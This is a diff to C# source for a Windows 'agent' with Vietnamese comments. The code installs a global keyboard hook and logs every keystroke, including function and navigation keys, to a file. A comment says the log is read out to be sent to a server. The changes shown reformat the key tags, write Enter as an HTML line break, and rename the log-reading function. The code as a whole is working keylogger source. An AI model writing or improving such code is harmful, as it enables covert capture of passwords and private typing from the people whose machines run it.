@@ -37,7 +37,7 @@ namespace WindowsAgent
             hookThread = new Thread(() =>
             {
                 _hookID = SetHook(_proc);
-                Application.Run(); // Tạo vòng lặp tin nhắn để giữ Hook hoạt động
+                System.Windows.Forms.Application.Run(); // Tạo vòng lặp tin nhắn để giữ Hook hoạt động
                 UnhookWindowsHookEx(_hookID);
             });
 
@@ -67,10 +67,8 @@ namespace WindowsAgent
         }
 
         // Hàm đọc log và xóa nội dung cũ (Để gửi về Server)
-        public string GetAndClearLogs()
+        public string GetLogs()
         {
-            if (!File.Exists(logPath)) return "";
-
             try
             {
                 string content = File.ReadAllText(logPath);
@@ -129,7 +127,7 @@ namespace WindowsAgent
         }
         if (key == Keys.Enter || key == Keys.Return)
         {
-            _buffer.AppendLine(); // Xuống dòng
+            _buffer.Append(" [Enter]<br>"); // Xuống dòng
             return;
         }
         if (key == Keys.Space)
@@ -139,7 +137,7 @@ namespace WindowsAgent
         }
         if (key == Keys.Tab)
         {
-            _buffer.Append("[TAB]");
+            _buffer.Append(" [TAB] ");
             return;
         }
 
@@ -202,31 +200,31 @@ namespace WindowsAgent
             case Keys.Decimal:  charKey = "."; break;
 
             // --- CÁC PHÍM ĐIỀU HƯỚNG & CHỨC NĂNG (Ghi dạng thẻ [TAG]) ---
-            case Keys.Escape:   charKey = "[ESC]"; break;
-            case Keys.Delete:   charKey = "[DEL]"; break;
-            case Keys.Home:     charKey = "[HOME]"; break;
-            case Keys.End:      charKey = "[END]"; break;
-            case Keys.PageUp:   charKey = "[PGUP]"; break;
-            case Keys.PageDown: charKey = "[PGDN]"; break;
-            case Keys.Left:     charKey = "[LEFT]"; break;
-            case Keys.Right:    charKey = "[RIGHT]"; break;
-            case Keys.Up:       charKey = "[UP]"; break;
-            case Keys.Down:     charKey = "[DOWN]"; break;
-            case Keys.PrintScreen: charKey = "[PRTSC]"; break;
+            case Keys.Escape:   charKey = " [ESC] "; break;
+            case Keys.Delete:   charKey = " [DEL] "; break;
+            case Keys.Home:     charKey = " [HOME] "; break;
+            case Keys.End:      charKey = " [END] "; break;
+            case Keys.PageUp:   charKey = " [PGUP] "; break;
+            case Keys.PageDown: charKey = " [PGDN] "; break;
+            case Keys.Left:     charKey = " [LEFT] "; break;
+            case Keys.Right:    charKey = " [RIGHT] "; break;
+            case Keys.Up:       charKey = " [UP] "; break;
+            case Keys.Down:     charKey = " [DOWN] "; break;
+            case Keys.PrintScreen: charKey = " [PRTSC] "; break;
 
             // Hàng phím F1-F12
-            case Keys.F1: charKey = "[F1]"; break;
-            case Keys.F2: charKey = "[F2]"; break;
-            case Keys.F3: charKey = "[F3]"; break;
-            case Keys.F4: charKey = "[F4]"; break;
-            case Keys.F5: charKey = "[F5]"; break;
-            case Keys.F6: charKey = "[F6]"; break;
-            case Keys.F7: charKey = "[F7]"; break;
-            case Keys.F8: charKey = "[F8]"; break;
-            case Keys.F9: charKey = "[F9]"; break;
-            case Keys.F10: charKey = "[F10]"; break;
-            case Keys.F11: charKey = "[F11]"; break;
-            case Keys.F12: charKey = "[F12]"; break;
+            case Keys.F1: charKey = " [F1] "; break;
+            case Keys.F2: charKey = " [F2] "; break;
+            case Keys.F3: charKey = " [F3] "; break;
+            case Keys.F4: charKey = " [F4] "; break;
+            case Keys.F5: charKey = " [F5] "; break;
+            case Keys.F6: charKey = " [F6] "; break;
+            case Keys.F7: charKey = " [F7] "; break;
+            case Keys.F8: charKey = " [F8] "; break;
+            case Keys.F9: charKey = " [F9] "; break;
+            case Keys.F10: charKey = " [F10] "; break;
+            case Keys.F11: charKey = " [F11] "; break;
+            case Keys.F12: charKey = " [F12] "; break;
 
             // --- MẶC ĐỊNH (CHỮ CÁI A-Z) ---
             default:
